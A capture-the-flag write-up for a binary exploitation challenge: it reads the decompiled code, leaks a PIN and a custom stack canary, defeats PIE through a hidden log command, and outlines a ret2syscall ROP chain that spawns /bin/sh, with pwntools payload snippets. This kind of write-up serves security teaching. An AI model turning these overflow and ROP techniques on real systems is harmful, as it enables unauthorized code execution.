# SparkCLI Revamp<!-- omit from toc -->

## Table of Contents<!-- omit from toc -->

- [Spark Shell's Functionality](#spark-shells-functionality)
- [Reading the Code](#reading-the-code)
  - [`main()`](#main)
  - [`sub_14B4()`](#sub_14b4)
  - [`sub_14FC()` and `sub_14B2()`](#sub_14fc-and-sub_14b2)
- [Bypassing Canary](#bypassing-canary)
- [Attempting Buffer Overflow](#attempting-buffer-overflow)
  - [Prerequisites](#prerequisites)
  - [Performing Buffer Overflow](#performing-buffer-overflow)
- [Dealing with PIE](#dealing-with-pie)
- [ret2syscall (execve)](#ret2syscall-execve)
  - [Obtaining ROP Gadgets](#obtaining-rop-gadgets)
  - [Finding Memory to Store Shellcode](#finding-memory-to-store-shellcode)
  - [Creating the ROP Chain](#creating-the-rop-chain)
- [Execute Your Exploit!](#execute-your-exploit)
- [Summary](#summary)

## Spark Shell's Functionality

Executing the program presents a shell-like looking interface, allowing for seemingly **three** possible commands to use.

```bash
Spark Shell!
Available commands: ls, cat <file>, exit

$
```

Issue now is the program has a built-in safety measure to prevent us from reading the `flag.txt`, and anything outside of `/home`.

However, we can read the contents of any file (with `r` perms).

```bash
$ ls
sparkcli
canary.txt
flag.txt
pin.txt
$ cat flag.txt
Access denied: File is flagged for dangerous behavior
$ cat pin.txt
046233$ cat canary.txt
N$ cat ../../../../etc/passwd
root:x:0:0:root:/root:/bin/bash
```

Exiting the program now shows a PIN lock.

```bash
$ exit

Before you leave, please enter the PIN: 046233
Incorrect PIN. Better luck next time!
```

Notice how the PIN we previously retrieved did not work? \
The PIN combination is always changing, and it is also always a 6-digit PIN. (this will be important later)

```bash
$ cat pin.txt
748306$ exit

Before you leave, please enter the PIN: 748306
Correct PIN! Congrats on that.
```

## Reading the Code

Note the following `checksec`.

```bash
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
```

Now to decompile the program to analyze and find the vulnerable pieces of code.

### `main()`

```c
__int64 __fastcall main(int a1, char **a2, char **a3)
{
  setvbuf(stdout, 0, 2, 0);
  sub_1613();
  sub_17B4();
  return 0;
}
```

There are **two** function calls, one to `sub_1613()` and `sub_17B4()`.

Looking at `sub_1613()`, it seems to all be checks and challenge setup, so I'll ignore it and focus on `sub_17B4()`.

```c
int sub_1613()
{
    ...
    puts("Error: Please create a pin.txt file to continue");
    ...
      puts("Error: PIN must contain only digits");
    ...
    puts("Error: Please create a canary.txt file to continue");
    ...
    puts("Error: Please create a flag.txt file to continue");
    ...
}
```

### `sub_14B4()`

```c
int sub_17B4()
{
  char s[78]; // [rsp+0h] [rbp-50h] BYREF
  __int16 s1; // [rsp+4Eh] [rbp-2h] BYREF

  puts("Spark Shell!");
  puts("Available commands: ls, cat <file>, exit\n");
  sub_14FC();
  s1 = *(_WORD *)word_4047;
  printf("\nBefore you leave, please enter the PIN: ");
  fgets(s, 356, stdin);
  if ( memcmp(&s1, word_4047, 2u) )
  {
    puts("*** !!! Stack Smashing Detected !!! ***");
    fflush(stdout);
    exit(0);
  }
  if ( strncmp(s, nptr, 6u) )
  {
    puts("Incorrect PIN. Better luck next time!");
    exit(0);
  }
  return puts("Correct PIN! Congrats on that.");
}
```

From this one function, we can conclude,

1. The PIN input is vulnerable to buffer overflow since `s` is a `78` char buffer while the fgets allows for the user to put `356`, which is more than what the `s` buffer can hold.

```c
  char s[78];
  ...
  fgets(s, 356, stdin);
```

2. A custom implementation of the stack canary, preventing buffer overflowing **IF** the canary is tempered with.

```c
__int16 s1;
if ( memcmp(&s1, word_4047, 2u) )
{
puts("*** !!! Stack Smashing Detected !!! ***");
fflush(stdout);
exit(0);
}
```

3. Getting the PIN wrong prevents buffer overflowing, exiting out of the program if the PIN is wrong.

```c
if ( strncmp(s, nptr, 6u) )
{
puts("Incorrect PIN. Better luck next time!");
exit(0);
}
```

### `sub_14FC()` and `sub_14B2()`

```c
int sub_14B2()
{
  ...
  v0 = atoi(nptr);
  return printf("Logged Signature: %p\n", (char *)sub_14B2 + v0);
}

int sub_14FC()
{
  ...
      if ( strcmp(s, "log") )
        break;
      sub_14B2();
  ...
}
```

`sub_14FC()` has an if statement logic for `cat`, `ls` and a secret command, `log`.

The PIN contents are stored in `nptr`. 

```c
src = sub_13A9("pin.txt");
...
strncpy(nptr, src, 6u);
```

A closer inspection of `sub_14B2()` shows that the logged signature is just the function address of `*sub_14B2()` + PIN.

This will be used for [dealing with PIE](#dealing-with-pie).

## Bypassing Canary

We have the following information that `s` is the buffer we use for buffer overflow, and `s1` to prevent such things from happening.

```c
char s[78]; // [rsp+0h] [rbp-50h] BYREF
__int16 s1; // [rsp+4Eh] [rbp-2h] BYREF
```

We can actually get the contents of `s1` by getting the contents of `canary.txt`.

```bash
$ cat canary.txt
N$ exit
```

However, the canary is **2 bytes**, but only one got printed out. Using one of the known byte `N`, we can use a bruteforcing method to find the canary.

Use the [`find_canary.py`](./find_canary.py) script to get the canary. (You may modify the script to have known byte to speed up the process)

```bash
Found canary bytes: 0x02 0x4e

Leaked Canary: N\x02
```

## Attempting Buffer Overflow

Now to create a payload that satisfies the following conditions:

1. The first 6 bytes of the payload should be the PIN number,
2. From 78-80 of the payload should be `\x4e\x02`,
3. The rest of the payload should be a cyclic payload (to find offset).

### Prerequisites

Installed the programs,

1. pwntools
2. pwndbg

### Performing Buffer Overflow

Have a python terminal open.

```bash
# python3
Python 3.13.2 (main, Mar XX XXXX, XX:XX:0XX7) [GCC XX.X.X] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>>
```

Copy the contents below and execute it within the python terminal. Place the newly opened GDB shell aside.

```python
from pwn import *
p = gdb.debug('./sparkcli', '''
    c
''')
```

Now to obtain the PIN.

```python
p.recvuntil(b'$ ')
p.sendline(b'cat pin.txt')
PIN = p.recvuntil(b'$ ').replace(b'$ ', b'').rstrip()
PIN
```

Copy and run the following lines into the python terminal:

```python
payload = fit({
    0: PIN,
    78: b'N\x02',
}, length=128, filler=cyclic(128, n=8))
```

Enter the PIN into the input line.

```python
>>> payload = fit({
...     0: input('PIN: ').encode(),
...     78: b'N\x02',
... }, length=128, filler=cyclic(128, n=8))
PIN: 123456
```

Now send the last few payloads.

```python
p.sendline(b'exit')
p.sendline(payload)
p.interactive()
```

Now switch to the GDB shell that was opened up by the python terminal.

```bash
───────[ DISASM / x86-64 / set emulate on ]───────
 ► 0x556ee86f58b0    ret      <0x616161616161616c>
```

Within pwndbg, copy the contents in `< >` and paste it into the cyclic finder.

```bash
pwndbg> cyclic -l 0x616161616161616c
Finding cyclic pattern of 8 bytes: b'laaaaaaa' (hex: 0x6c61616161616161)
Found at offset 88
```

Now that the offset has been found, we can finally go on to exploiting the program!

## Dealing with PIE

Remember that the program has PIE **Enabled**.

```bash
    PIE:        PIE enabled
```

We need to leak the address to obtain the base address. Recall [`sub_14FC()` and `sub_14B2()`](#sub_14fc-and-sub_14b2).

```bash
$ log
Logged Signature: 0x555555554000
```

Remember that the logged signature is `*sub_14B2()` + PIN.

To calculate the base address,

```
*sub_14b2() = Logged Signature - PIN
Base Address = *sub_14b2() - 0x165c
```

## ret2syscall (execve)

### Obtaining ROP Gadgets

Use the `ROPgadget` command to obtain the ROP gadgets.

```bash
ROPgadget --binary sparkcli | grep -E ': (pop|mov r|mov q|syscall)' > rop.txt
```

> [!note]
> The `grep` statements were only used for this binary example specifically to reduce the number of things to look at.

### Finding Memory to Store Shellcode

Now to find a writable region to store the shellcode into.

```python
b'/bin/sh\x00'
```

```bash
pwndbg> vmmap
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
             Start                End Perm     Size Offset File (set vmmap-prefer-relpaths on)
    0x555555554000     0x555555555000 r--p     1000      0 sparkcli
    0x555555555000     0x555555557000 r-xp     2000   1000 sparkcli
    0x555555557000     0x555555558000 r--p     1000   2000 sparkcli
    0x555555558000     0x555555559000 rw-p     1000   3000 sparkcli
pwndbg> piebase
Calculated VA from sparkcli = 0x555555554000
```

Starting `0x555555558000` is where I can write the shellcode string to.

Calculate the offset,

```python
Shellcode Addr = Writable Addr. - Base Addr.

0x555555558000 - 0x555555554000 = 0x4000
```

### Creating the ROP Chain

Make use of the found gadgets to perform the following processes:

- Store the shellcode `b'/bin/sh\x00'` into the writable memory region.
- Store the address of the writable memory into register `RDI`.
- Store the `execve` (`0x3b`) instruction for syscall into register `RAX`.
- Set the registers `RSI` and `RDX` as `0`

You may do this at any order as long as the final result is:

```python
RAX = 0x3b
RDI = shcode_ptr
RSI = 0
RDX = 0
```

> [!tip] Syscalls
> For more information regarding syscalls, [click on me](https://www.chromium.org/chromium-os/developer-library/reference/linux-constants/syscalls/).

At the very end of the ROP chain, it should execute `syscall()` to gain shellcode to read the flags contents!

## Execute Your Exploit!

You should end up with something like [this](./soln.py) if you are using **pwntools**. You may also do this the traditional or step-by-step way to obtain the flag.

## Summary

1. Read the contents of `pin.txt` and `canary.txt`
2. *(Optionally)* If the canary contents are unclear, bruteforce both byte values.
3. Get the address of `sub_14B2()` using the hidden command `log`.
4. Calculate the base address to be used by any ret addresses or ROP gadgets.
5. Obtain the ROP gadgets of the binary.
6. Create a ROP chain based on the gadgets to do a ret2syscall.
7. Create the payload with: `PIN + offset + canary + remaining offset + ROP chain`
